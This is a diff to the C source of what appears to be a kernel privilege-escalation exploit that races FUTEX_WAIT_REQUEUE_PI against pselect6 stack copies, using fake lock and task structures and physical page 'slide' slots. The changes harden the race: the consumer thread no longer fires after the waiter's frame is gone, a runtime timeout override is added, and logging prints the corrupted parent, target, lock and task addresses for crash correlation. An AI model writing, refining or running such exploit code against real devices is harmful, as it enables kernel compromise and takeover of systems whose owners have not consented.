@@ -40,6 +40,8 @@ static atomic_int slide_consume_sched_ok;
 static atomic_int slide_consume_last_sched_ret;
 static atomic_int slide_consume_last_sched_errno;
 static atomic_int slide_consumer_ready;
+static atomic_llong slide_wait_start_ns;
+static atomic_int slide_pselect_armed;
 static atomic_int slide_pselect_write_window;
 static int slide_pselect_nfds = PSELECT_ROUTE_NFDS;
 static int slide_syscall_pad;
@@ -293,6 +295,21 @@ void slide_pselect_stack_copy(void) {
     .tv_nsec = 0,
 #endif
   };
+  /* Runtime override: under load the consumer burst can slip tens of ms
+   * past the compile-time window and the walk then hits the dead stack
+   * frame (trylock(NULL) panics).  SLIDE_PSELECT_TIMEOUT_MS widens the
+   * armed window without a rebuild. */
+  const char *timeout_env = getenv("SLIDE_PSELECT_TIMEOUT_MS");
+  if (timeout_env && *timeout_env) {
+    char *end = NULL;
+    errno = 0;
+    long value = strtol(timeout_env, &end, 0);
+    if (!errno && end != timeout_env && !*end && value >= 1 &&
+        value <= 60000) {
+      timeout.tv_sec = value / 1000;
+      timeout.tv_nsec = (value % 1000) * 1000000L;
+    }
+  }
   struct timespec *timeoutp = &timeout;
 
   size_t pselect_started = gettime_ns();
@@ -300,12 +317,14 @@ void slide_pselect_stack_copy(void) {
     syscall(SYS_gettid);
   }
   atomic_store(&slide_consume_go, 1);
+  atomic_store(&slide_pselect_armed, 1);
   errno = 0;
   int ret = (int)syscall(SYS_pselect6, slide_pselect_nfds,
                          &in, &out, &ex, timeoutp, NULL);
   int saved_errno = errno;
   size_t pselect_elapsed_usec =
       (gettime_ns() - pselect_started) / 1000ULL;
+  atomic_store(&slide_pselect_armed, 0);
   atomic_store(&slide_consume_go, 0);
 
   if (atomic_load(&slide_consume_enter_sched) != 0 &&
@@ -422,6 +441,14 @@ void *slide_consumer_thread(void *arg __attribute__((unused))) {
 
     int tid = atomic_load(&slide_waiter_tid);
     for (int burst_idx = 0; burst_idx < burst; burst_idx++) {
+      /* Never fire at a dead stack frame: once the waiter's pselect has
+       * returned, the armed waiter image is gone and the walk reads
+       * cleanup-zeroed/garbage fields (trylock(NULL) family of panics).
+       * Under load the spacing sleep can overshoot the whole window, so
+       * re-check before every shot. */
+      if (!atomic_load(&slide_pselect_armed)) {
+        break;
+      }
       int calls = atomic_load(&slide_consume_calls);
       int entered = atomic_load(&slide_consume_enter_sched) + 1;
       atomic_store(&slide_consume_enter_sched, entered);
@@ -434,6 +461,13 @@ void *slide_consumer_thread(void *arg __attribute__((unused))) {
         ret = 0;
         saved_errno = 0;
       } else {
+        pr_info("slide consumer sched idx=%d tid=%d t=%llu\n", burst_idx, tid,
+                (unsigned long long)(
+                    (gettime_ns() - (size_t)atomic_load(&slide_wait_start_ns)) /
+                    1000ULL));
+        if (!atomic_load(&slide_pselect_armed)) {
+          break;
+        }
         ret = sched_setattr_tid(tid, (calls % 19) + 1);
         saved_errno = *errno_ptr;
       }
@@ -479,10 +513,14 @@ void *slide_waiter_thread(void *arg __attribute__((unused))) {
 
   atomic_store(&slide_waiter_waiting, 1);
   errno = 0;
+  size_t wait_start_ns = gettime_ns();
+  atomic_store(&slide_wait_start_ns, (long long)wait_start_ns);
   long wait_ret = futex_op(&slide_f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
                            &slide_f_pi_target, 0);
   int wait_errno = errno;
-  pr_info("slide wait_requeue_pi ret=%ld errno=%d\n", wait_ret, wait_errno);
+  pr_info("slide wait_requeue_pi ret=%ld errno=%d t=%llu\n", wait_ret,
+          wait_errno,
+          (unsigned long long)((gettime_ns() - wait_start_ns) / 1000ULL));
   if (wait_ret != -1 || wait_errno != ETIMEDOUT) {
     atomic_store(&slide_route_done, 1);
     return NULL;
@@ -496,10 +534,14 @@ void *slide_waiter_thread(void *arg __attribute__((unused))) {
     atomic_store(&slide_route_done, 1);
     return NULL;
   }
+  pr_info("slide waiter unlock done t=%llu\n",
+          (unsigned long long)((gettime_ns() - wait_start_ns) / 1000ULL));
   while (!atomic_load(&slide_owner_acquired)) {
     __asm__ volatile("yield" ::: "memory");
   }
 
+  pr_info("slide waiter arming pselect t=%llu\n",
+          (unsigned long long)((gettime_ns() - wait_start_ns) / 1000ULL));
   slide_pselect_stack_copy();
   atomic_store(&slide_route_done, 1);
 
@@ -723,6 +765,14 @@ static int slide_trigger_physical_slot(size_t slot) {
   if (!select_slide_payload_index(slot)) {
     return 0;
   }
+  /* Crash-correlation: if the walk fires into a live page (reclaim miss),
+   * the panic log's corrupted address should equal parent+0x08/+0x10 and the
+   * written value should equal target.  Print all four addresses so a later
+   * /data/log/prev_dump.log analysis can confirm or refute this. */
+  pr_info("p0 physical slot=%zu page_base=%016zx pipebuf=%016zx parent=%016zx "
+          "target=%016zx lock=%016zx task=%016zx\n",
+          slot, page_base, pipebuf_page_base, slide_oracle_parent,
+          slide_oracle_target, fake_lock, fake_task);
   char delay_arg[16];
   int delay = (int)slide_enter_delay_usec();
   slide_pselect_nfds = PSELECT_ROUTE_NFDS;
